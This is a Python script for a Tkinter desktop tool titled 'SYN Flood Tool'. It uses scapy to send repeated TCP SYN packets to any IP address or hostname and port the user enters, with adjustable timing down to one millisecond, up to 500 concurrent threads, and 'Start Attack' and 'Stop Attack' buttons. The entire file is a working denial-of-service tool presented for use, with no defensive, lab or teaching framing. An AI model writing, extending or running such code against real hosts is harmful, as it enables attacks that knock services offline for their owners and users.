import tkinter as tk
from tkinter import messagebox, scrolledtext
from scapy.all import IP, TCP, send
import threading
import time
import socket

running = False

def syn_flood(target_ip, target_port, log_output, frequency_scale, threads_scale):
    def attack():
        while running:
            try:
                packet = IP(dst=target_ip) / TCP(dport=target_port, flags='S')
                send(packet, verbose=0)  

                log_output.insert(tk.END, f"SYN packet sent to {target_ip}:{target_port}\n")
                log_output.yview(tk.END)

                time.sleep(float(frequency_scale.get()))  

            except Exception as e:
                log_output.insert(tk.END, f"Error sending packet: {e}\n")
                log_output.yview(tk.END)
                break

    threads = []
    for _ in range(threads_scale.get()):  
        if not running:
            break
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)  

    for thread in threads:
        thread.join()

def resolve_hostname(hostname):
    try:
        return socket.gethostbyname(hostname)
    except socket.gaierror as e:
        messagebox.showerror("Resolution Error", f"Could not resolve hostname: {e}")
        return None

def start_attack():
    global running
    target_input = ip_entry.get()
    target_port = port_entry.get()

    if not target_input or not target_port:
        messagebox.showerror("Input Error", "Please enter a target IP or hostname and port.")
        return

    if target_input.replace('.', '').isdigit():  
        target_ip = target_input
    else:
        target_ip = resolve_hostname(target_input)
        if target_ip is None:
            return 

    try:
        target_port = int(target_port)  
        if not (1 <= target_port <= 65535):  
            raise ValueError("Port must be between 1 and 65535.")
    except ValueError as e:
        messagebox.showerror("Input Error", str(e))
        return

    running = True
    log_output.insert(tk.END, f"Starting SYN flood attack on {target_ip}:{target_port}\n")
    threading.Thread(target=syn_flood, args=(target_ip, target_port, log_output, frequency_scale, threads_scale)).start()

def stop_attack():
    global running
    running = False
    log_output.insert(tk.END, "Attack stopped.\n")
    log_output.yview(tk.END)

app = tk.Tk()
app.title("SYN Flood Tool")
app.geometry("500x500")

tk.Label(app, text="Target IP or Hostname:").pack()
ip_entry = tk.Entry(app, width=30)
ip_entry.pack()

tk.Label(app, text="Target Port:").pack()
port_entry = tk.Entry(app, width=10)  
port_entry.pack()

tk.Label(app, text="Request Frequency (seconds):").pack()
frequency_scale = tk.Scale(app, from_=0.001, to=0.1, resolution=0.001, orient="horizontal")
frequency_scale.set(0.01)  
frequency_scale.pack()

tk.Label(app, text="Number of Concurrent Threads:").pack()
threads_scale = tk.Scale(app, from_=1, to=500, orient="horizontal") 
threads_scale.set(100)
threads_scale.pack()

start_button = tk.Button(app, text="Start Attack", command=start_attack, bg="red", fg="white")
start_button.pack(pady=10)

stop_button = tk.Button(app, text="Stop Attack", command=stop_attack, bg="green", fg="white")
stop_button.pack()

tk.Label(app, text="Log Output:").pack()
log_output = scrolledtext.ScrolledText(app, width=60, height=10)
log_output.pack()

app.mainloop()


